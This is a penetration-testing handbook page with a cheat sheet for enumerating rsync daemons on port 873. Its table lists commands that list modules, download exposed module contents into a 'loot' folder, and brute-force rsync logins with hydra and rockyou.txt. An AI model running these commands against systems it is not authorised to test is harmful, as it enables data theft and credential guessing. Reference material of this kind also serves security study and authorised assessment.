---
title: Rsync (873)
type: handbook
weight: 13
---
---

### Cheat sheet 

### Rsync Enumeration & Exploitation

| Command                                                                       | Description                                 |
|-------------------------------------------------------------------------------|---------------------------------------------|
| `nmap -p873 --script rsync-list-modules <target>`                             | Enumerate available rsync modules           |
| `rsync <target>::`                                                            | List public rsync modules                   |
| `rsync <target>::<module>`                                                    | Attempt anonymous listing of a module       |
| `rsync -av <target>::<module> ./loot`                                         | Download full contents of an exposed module |
| `rsync -av rsync://<target>/<module> ./loot`                                  | Alternate syntax to pull module data        |
| `rsync -av -e 'ssh -p 2222' user@host:/path ./loot`                           | Rsync over SSH on non-default port          |
| `hydra -l user -P rockyou.txt rsync://<target>`                               | Brute-force rsync login (only if required)  |


### NSE Scripts

`find / -type f -name "*rsync" | grep nmap/scripts`

`/usr/share/nmap/scripts/rsync-list-modules.nse`


**Rsync** is a fast file copying and synchronization tool commonly used to sync data between servers or to back up files. When run in daemon mode (rsync --daemon), it listens on TCP port 873 and exposes file shares called modules.

It supports:
• Anonymous read access (if allowed)<br>
• Optional authentication (username/password)<br>
• File sync over SSH or natively via port 873<br>


